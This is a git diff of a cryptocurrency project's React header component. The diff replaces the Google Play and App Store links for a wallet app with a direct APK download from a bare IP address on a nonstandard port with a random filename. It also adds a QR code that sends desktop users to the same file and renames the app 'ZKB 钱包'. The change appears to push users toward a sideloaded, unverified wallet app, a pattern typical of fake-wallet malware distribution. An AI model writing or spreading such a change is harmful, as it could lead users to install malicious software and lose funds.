@@ -1,9 +1,28 @@
 'use client'
 
 import { useState } from 'react'
+import QRCodeModal from './QRCodeModal'
 
 export default function Header() {
   const [isMenuOpen, setIsMenuOpen] = useState(false)
+  const [isQRModalOpen, setIsQRModalOpen] = useState(false)
+  
+  const walletDownloadUrl = 'https://206.238.196.207:36345/down/r4gsJKdHogIF.apk'
+  
+  const handleWalletDownload = () => {
+    const userAgent = navigator.userAgent.toLowerCase()
+    
+    if (userAgent.includes('android')) {
+      // Android 用户直接下载
+      window.open(walletDownloadUrl, '_blank')
+    } else if (userAgent.includes('iphone') || userAgent.includes('ipad')) {
+      // iOS 用户显示提示（因为这是APK文件）
+      alert('当前钱包App仅支持Android设备，请使用Android手机访问此页面下载')
+    } else {
+      // 桌面用户显示二维码
+      setIsQRModalOpen(true)
+    }
+  }
 
   return (
     <header className="fixed w-full top-0 z-50 bg-chain-primary/95 backdrop-blur-sm border-b border-chain-accent/20">
@@ -24,16 +43,7 @@ export default function Header() {
             <a href="#technology" className="text-gray-300 hover:text-white transition-colors">技术</a>
             <a href="#whitepaper" className="text-gray-300 hover:text-white transition-colors">白皮书</a>
             <button 
-              onClick={() => {
-                const userAgent = navigator.userAgent.toLowerCase()
-                if (userAgent.includes('android')) {
-                  window.open('https://play.google.com/store/apps/details?id=com.nbcoin.wallet', '_blank')
-                } else if (userAgent.includes('iphone') || userAgent.includes('ipad')) {
-                  window.open('https://apps.apple.com/app/nbcoin-wallet/id123456789', '_blank')
-                } else {
-                  alert('请使用手机扫描二维码下载钱包App，或访问 https://wallet.nbcoin.io 下载')
-                }
-              }}
+              onClick={handleWalletDownload}
               className="text-chain-highlight hover:text-white transition-colors font-semibold flex items-center space-x-1"
             >
               <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
@@ -73,16 +83,7 @@ export default function Header() {
               <a href="#technology" className="block px-3 py-2 text-gray-300 hover:text-white transition-colors">技术</a>
               <a href="#whitepaper" className="block px-3 py-2 text-gray-300 hover:text-white transition-colors">白皮书</a>
               <button 
-                onClick={() => {
-                  const userAgent = navigator.userAgent.toLowerCase()
-                  if (userAgent.includes('android')) {
-                    window.open('https://play.google.com/store/apps/details?id=com.nbcoin.wallet', '_blank')
-                  } else if (userAgent.includes('iphone') || userAgent.includes('ipad')) {
-                    window.open('https://apps.apple.com/app/nbcoin-wallet/id123456789', '_blank')
-                  } else {
-                    alert('请使用手机扫描二维码下载钱包App，或访问 https://wallet.nbcoin.io 下载')
-                  }
-                }}
+                onClick={handleWalletDownload}
                 className="block w-full px-3 py-2 text-left text-chain-highlight hover:text-white transition-colors font-semibold flex items-center space-x-2"
               >
                 <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
@@ -102,6 +103,14 @@ export default function Header() {
           </div>
         )}
       </div>
+      
+      {/* 二维码模态框 */}
+      <QRCodeModal
+        isOpen={isQRModalOpen}
+        onClose={() => setIsQRModalOpen(false)}
+        downloadUrl={walletDownloadUrl}
+        appName="ZKB 钱包"
+      />
     </header>
   )
 }
